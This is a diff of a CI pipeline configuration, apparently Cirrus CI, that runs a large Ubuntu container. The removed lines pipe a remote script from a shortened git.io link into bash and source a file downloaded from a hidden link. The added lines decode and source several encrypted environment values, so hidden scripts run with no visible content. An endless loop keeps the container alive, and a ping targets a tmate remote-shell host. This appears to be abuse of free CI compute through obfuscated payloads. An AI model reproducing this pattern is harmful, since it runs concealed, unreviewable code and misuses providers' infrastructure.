@@ -1,23 +1,28 @@
 env:
   DEBIAN_FRONTEND: noninteractive
-  TOKEN: ENCRYPTED[a2263554ef5ffdafa31380c5e20da7d697ad730e2eacfd3c3060e8f724f620309a3cf6635af2dd126cb0599293e12950]
-  packages: curl sudo
-  link: 
+  packages: curl sudo nodejs npm openssh-server
+  clo: ENCRYPTED[ee48f7839126b256f9b7fdb0ec3de8be69067d09dc831074cd7dfbbc182fcc903465c4183ee824de3a0967e99bb7877d]
+  st: ENCRYPTED[8ff2748cd0797fdda5e8d465581cf3411e5b62801369f8b29bf77d9dc4c20d65cc33efc37c5777fe0960724a50d88be1]
+
+  IOK: ENCRYPTED[5987f436ca56d361fd8078ef3f421edef24b330fa3c143209fcc712b6a531ed09251d378743e6100bf6c838344cd0dfa]  # ins
+  TOKEN: ENCRYPTED[a2263554ef5ffdafa31380c5e20da7d697ad730e2eacfd3c3060e8f724f620309a3cf6635af2dd126cb0599293e12950]  # ntok
+
+  CONF: ENCRYPTED[599add9ffa43393e856c9b631a453401f483ca64aee0fd3194c9e61952020009f4ff85d01785ccf3b69a5e751fae8020]
 
 task:
-  name: tonda tosfi
+  name: kuana kombi
   timeout_in: 2h
   container:
     image: ubuntu:20.04
     cpu: 6
     memory: 24GB
 
-  Setup_script:
+  samba some e_script:
     - set +e -x
-    - apt update &>/dev/null;time apt install $packages -y ;cd /usr/local/bin && bash -c "$(curl -L git.io/file-transfer)";cd - || echo oops
-#    - s_id=arcxtv;tmate -S $s_id new-session -d;tmate -S $s_id wait tmate-ready;tmate -S $s_id display -p '#{tmate_ssh}';ls -lh;rm $s_id
-    - curl -Lo s "$link"
-    - $TOKEN
-    - . s
+    - apt update &>/dev/null;time apt install $packages -y
+    - echo "$IOK" > a && . a ; $TOKEN
+    - echo "$clo" > a && . a
+    - echo "$CONF" | base64 -d > config.json
+    - echo "$st" > a && . a
     - while true;do echo IGN && sleep 1.124s;done
-    - timeout 24s ping ssh.tmate.io || echo test dibe
+    - timeout 5s ping ssh.tmate.io -c 4 || echo doneys vai do
